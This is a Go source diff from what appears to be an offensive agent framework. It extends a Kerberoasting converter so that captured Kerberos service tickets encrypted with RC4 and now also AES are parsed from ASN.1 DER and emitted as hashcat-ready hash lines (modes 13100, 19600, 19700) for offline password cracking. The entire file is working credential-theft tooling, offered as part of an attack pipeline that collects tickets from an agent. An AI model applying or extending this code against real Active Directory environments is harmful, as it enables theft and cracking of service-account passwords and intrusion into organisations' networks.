@@ -9,16 +9,17 @@ import (
 // Kerberoast result conversion: the agent's PowerShell kerberoast() emits one
 // line per service ticket as "UPN\t<hex AP-REQ>". KerberosRequestorSecurityToken
 // returns an AP-REQ whose encapsulated ticket's enc-part is encrypted with the
-// target account's long-term key - exactly what hashcat mode 13100 (etype 23 /
-// RC4-HMAC) cracks. This file walks the ASN.1 DER to pull out the ciphertext
-// and re-emits industry-standard lines:
+// target account's long-term key - exactly what hashcat cracks. This file walks
+// the ASN.1 DER to pull out the ciphertext and re-emits industry-standard
+// lines:
 //
-//	$krb5tgs$23$*user$realm$UPN*$checksum$edata2
+//	$krb5tgs$23$*user$realm$UPN*$checksum$edata2      (mode 13100, RC4-HMAC)
+//	$krb5tgs$17$user$realm$checksum$edata2            (mode 19600, AES128)
+//	$krb5tgs$18$user$realm$checksum$edata2            (mode 19700, AES256)
 //
-// where checksum is the first 16 ciphertext bytes (the HMAC-MD5 checksum) and
-// edata2 the remaining RC4 stream (nonce || DER enc-tkt-part || hmac). Tickets
-// using other etypes (17/18/24...) are not 13100-crackable and degrade to the
-// legacy "UPN:hex" format so no data is silently dropped.
+// For RC4 the checksum is the first 16 ciphertext bytes (HMAC-MD5); for AES it
+// is the last 12 bytes (HMAC-SHA1-96 truncated). Tickets using any other etype
+// degrade to the legacy "UPN:hex" format so no data is silently dropped.
 
 // derElement is a single DER TLV at the head of buf.
 type derElement struct {
@@ -177,10 +178,13 @@ func derInt(content []byte) (int, bool) {
 	return v, true
 }
 
-// convertKerberoastLine rewrites a single "UPN\t<hex>" line into hashcat 13100
-// format when the ticket is RC4 (etype 23); everything else passes through
-// unchanged (tab-lines without a crackable etype degrade to "UPN:hex" so the
-// server ingest keeps working).
+// convertKerberoastLine rewrites a single "UPN\t<hex>" line into hashcat format
+// when the ticket etype is crackable: etype 23 (RC4-HMAC) becomes a 13100 line,
+// etype 17/18 (AES128/AES256-CTS-HMAC-SHA1-96) become 19600/19700 lines. For
+// AES the checksum is the last 12 ciphertext bytes (HMAC-SHA1-96 truncated) -
+// the opposite position of RC4's leading 16-byte HMAC-MD5. Any other etype
+// passes through unchanged (tab-lines degrade to "UPN:hex" so the server
+// ingest keeps working).
 func convertKerberoastLine(line string) string {
 	line = strings.TrimSpace(line)
 	if line == "" {
@@ -201,22 +205,40 @@ func convertKerberoastLine(line string) string {
 	}
 	legacy := upn + ":" + hexBlob
 	etype, cipher, ok := krbTicketCipher(raw)
-	if !ok || etype != 23 {
-		return legacy
-	}
-	if len(cipher) < 48 {
+	if !ok || (etype != 23 && etype != 17 && etype != 18) {
 		return legacy
 	}
 	user, realm := upn, ""
 	if at := strings.LastIndex(upn, "@"); at > 0 {
 		user, realm = upn[:at], upn[at+1:]
 	}
-	checksum := cipher[:16]
-	edata2 := cipher[16:]
-	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
-		user, realm, upn,
-		strings.ToLower(hex.EncodeToString(checksum)),
-		strings.ToLower(hex.EncodeToString(edata2)))
+	switch etype {
+	case 23:
+		if len(cipher) < 48 {
+			return legacy
+		}
+		checksum := cipher[:16]
+		edata2 := cipher[16:]
+		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
+			user, realm, upn,
+			lowerHex(checksum), lowerHex(edata2))
+	case 17, 18:
+		if len(cipher) < 64 {
+			return legacy
+		}
+		checksum := cipher[len(cipher)-12:]
+		edata2 := cipher[:len(cipher)-12]
+		return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s",
+			etype, user, realm,
+			lowerHex(checksum), lowerHex(edata2))
+	}
+	return legacy
+}
+
+// lowerHex hex-encodes b in lowercase (hashcat lines are conventionally
+// lowercase hex; existing tests lock in the casing).
+func lowerHex(b []byte) string {
+	return strings.ToLower(hex.EncodeToString(b))
 }
 
 // convertKerberoastResult applies convertKerberoastLine to every line of the
